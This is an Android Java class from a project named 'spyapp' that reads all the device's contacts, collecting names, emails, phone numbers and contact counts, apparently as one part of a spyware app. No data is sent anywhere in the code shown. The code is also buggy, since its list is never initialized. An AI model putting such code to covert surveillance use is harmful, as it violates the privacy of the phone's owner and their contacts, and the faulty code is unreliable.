package com.example.spyapp;

import java.util.ArrayList;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

public class ListContact {
	
	private String WhosContactList;
	private ArrayList<Contact> ContactList;
	
	public void CreateListContactFromPhone(Context context){
		 
		 
		 String Contactinfos="";
		ArrayList<String> ContactsInfos = new ArrayList<String>();
		
		ContentResolver cr = context.getContentResolver();
      Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
              null, null, null, null);
      if (cur.getCount() > 0)
      {
    	  while (cur.moveToNext()) 
    	  {
              String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
              Cursor cur1 = cr.query( 
                      ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                      ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", 
                              new String[]{id}, null); 
              while (cur1.moveToNext()) 
              {
            	  Contact contact= new Contact();
                  //to get the contact names & mail
                  String name=" <name>"+cur1.getString(cur1.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))+"</name> ";
                  contact.setDisplayName(name);
                  // Log.e("Name :", name);
                  String email =" <mail>" +cur1.getString(cur1.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA))+"</mail>";
                  contact.setEmail(email);
             
                  // Récupération des téléphones
                 if (Integer.parseInt(cur.getString(
                         cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0)
                 {
                      Cursor pCur = cr.query(
                     		 ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
                     		 null, 
                     		 ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", 
                     		 new String[]{id}, null);
                      
                      ArrayList<Phone>PhonesNumbers=new ArrayList<Phone>();
            
                      while (pCur.moveToNext()) {
                     String	  phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                     String	timeContact=pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED));
                   Phone phone= new Phone(phoneNo, timeContact);
                   PhonesNumbers.add(phone);
                      							}
                      contact.setPhone(PhonesNumbers);
                  }
                 
                 ContactList.add(contact);
                
              }
              
              cur1.close();
             // Ajout des adresses
          }
      }
	}
}
